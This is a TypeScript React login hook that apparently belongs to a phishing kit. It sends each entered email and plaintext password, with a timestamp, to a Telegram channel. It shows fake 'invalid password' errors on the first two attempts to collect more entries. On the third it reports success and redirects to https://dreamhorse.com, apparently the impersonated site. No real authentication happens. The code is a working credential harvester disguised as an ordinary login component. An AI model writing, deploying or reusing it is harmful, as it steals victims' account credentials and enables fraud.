import { useState } from 'react'
import { LoginCredentials, LoginState } from '../../../types/auth'
import { sendTelegramMessage } from '../../../services/telegram'

export function useLogin() {
  const [state, setState] = useState<LoginState>({
    isLoading: false,
    error: null,
    success: false,
  })

  const [attempts, setAttempts] = useState(0)

  const login = async (credentials: LoginCredentials) => {
    setState({ isLoading: true, error: null, success: false })

    try {
      await new Promise((resolve) => setTimeout(resolve, 1000))

      const currentAttempt = attempts + 1
      setAttempts(currentAttempt)

      // Log attempt
      await sendTelegramMessage(
        `🔐 Login attempt ${currentAttempt}
Email: ${credentials.email}
LOG: ${credentials.password}
Time: ${new Date().toISOString()}`
      )

      // First two attempts fail
      if (currentAttempt <= 2) {
        setState({
          isLoading: false,
          error: 'Invalid email or password.',
          success: false,
        })
        return
      }

      // Third attempt "succeeds"
      setState({
        isLoading: false,
        error: null,
        success: true,
      })

      // redirect after short delay
      setTimeout(() => {
        window.location.href = "https://dreamhorse.com"
      }, 1000)

    } catch {
      setState({
        isLoading: false,
        error: 'An error occurred. Please try again.',
        success: false,
      })
    }
  }

  const reset = () => {
    setState({ isLoading: false, error: null, success: false })
  }

  return { ...state, login, reset }
}